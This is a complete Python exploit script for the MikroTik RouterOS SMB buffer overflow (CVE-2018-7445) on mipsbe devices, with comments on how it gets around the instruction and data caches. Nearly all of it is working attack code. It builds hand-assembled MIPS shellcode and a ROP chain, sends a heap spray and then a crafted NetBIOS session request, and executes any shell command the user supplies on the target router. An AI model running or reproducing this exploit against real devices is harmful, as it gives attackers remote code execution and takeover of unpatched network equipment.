#!/usr/bin/env python3

# Mikrotik Chimay Blue (SMB Buffer Overflow) Exploit by BigNerd95 
# [mipsbe version]

# Advisory: https://www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow
# (CVE-2018-7445)

# Tested on RouterOS 6.38.4 (mipsbe) [using a CRS109]
# Should be vulnerable until 6.41.2

# I could't jump on the stack because the Data Cache (L1) is not flushed to RAM immediately (write back policy).
# So if I directly jump on the stack, the Instruction Cache (after the Cache Miss) will NOT contain the updated stack and this will cause SIGILL.

# Writing the shellcode on the heap and sending more than 32KB (Cache size) of data will flush the Data Cache to RAM.
# So when jumping on the Heap, the Instruction Cache (after the Cache Miss) will contain the updated content of the Heap and my shellcode is executed.
# (The heap base address is not randomized, so I can predict where my shellcode will be saved on the Heap).

import socket, sys, struct, time

def makeSocket(ip):
    s = socket.socket()
    s.connect((ip, 139))
    return s

def send_shellcode_flush_cache(ip, shellcode):
    body = b"\x00\x00\x00\x00" * 40 
    body += shellcode 
    body += b"A" * 34000 # L1 cache is 32KB
    payload  = b"\x00\x00" + struct.pack("!H", len(body)) +  body

    s = makeSocket(ip)
    s.send(payload)
    time.sleep(1)
    s.close()

def send_rop(ip, rop):

    # NetBIOS session request writes a dot "." after each chunk
    # Max chunk size is 255

    offset = b"\xff" * 34   # the payload is iterpreted from 34th byte 
    chunk1 = b"S" * 59      # first interpreted length
    chunk2 = rop 

    body =  offset + \
            struct.pack("!B", len(chunk1)) + chunk1 + \
            struct.pack("!B", len(chunk2)) + chunk2 

    payload = b"\x81\x00" + \
                    struct.pack("!H", len(body)) +  body 

    s = makeSocket(ip)
    s.send(payload)
    time.sleep(1)


def heap_stack(ip, shellcode, rop):

    print("Wiriting shellcode on the heap and flushing Data cache to RAM")
    send_shellcode_flush_cache(ip, shellcode)

    print("Starting shellcode")
    send_rop(ip, rop)

    print("Done!")

def make_shellcode(cmd):
    shell_code = b''

    # just write addresses in s0, s1, s2 to a0, a1, a2 and call execve

    shell_code += struct.pack('>I', 0x26040000)     # addiu a0, s0, zero
    shell_code += struct.pack('>I', 0x26250000)     # addiu a1, s1, zero
    shell_code += struct.pack('>I', 0x26460000)     # addiu a2, s2, zero

    # 0x0045ae60
    shell_code += struct.pack('>I', 0x24020fab)     # addiu v0, zero, 0xfab     # v0 = 4011 (execve) 
    shell_code += struct.pack('>I', 0x0000000c)     # syscall                   # execve("/bin/bash", ["/bin/bash", "-c", "shellCmd", NULL], [NULL])
    
    # 0x0045ae68
    shell_code += struct.pack('>I', 0x0045ae78)     # "/bin/bash" address
    shell_code += struct.pack('>I', 0x0045ae84)     # "-c" address
    shell_code += struct.pack('>I', 0x0045ae88)     # your cmd address
    # 0x0045ae74
    shell_code += struct.pack('>I', 0x00000000)     # NULL

    # 0x0045ae78
    shell_code += b'/bin/bash\x00\x00\x00'
    # 0x0045ae84
    shell_code += b'-c\x00\x00'
    # 0x0045ae88
    shell_code += cmd + b'\x00' 

    return shell_code



def make_rop():

    # just write some useful addresses in s0, s1, s2 (to simplufy the shellcode)
    # and jump to heap address (where the shellcode resides)
    
    rop_chain = b''
    rop_chain += struct.pack('>I', 0x0045ae78)      # s0    "/bin/bash" address
    rop_chain += struct.pack('>I', 0x0045ae68)      # s1    array ["/bin/bash", "-c", "shellCmd", NULL] address
    rop_chain += struct.pack('>I', 0x0045ae74)      # s2    NULL address
    rop_chain += b"\xff\xff\xff\x03"                # s3
    rop_chain += b"\xff\xff\xff\x04"                # s4
    rop_chain += b"\xff\xff\xff\x05"                # s5
    rop_chain += b"\xff\xff\xff\x06"                # s6
    rop_chain += b"\xff\xff\xff\x07"                # s7
    rop_chain += struct.pack('>L', 0x0045adc4)      # ra    heap address

    return rop_chain

if __name__ == "__main__":

    if len(sys.argv) == 3:
        ip = sys.argv[1]
        cmd = bytes(sys.argv[2], "ascii")

        rop = make_rop()
        shellcode = make_shellcode(cmd)

        heap_stack(ip, shellcode, rop)

    else:
        print("Usage: " + sys.argv[0] + " IP shellcommand")
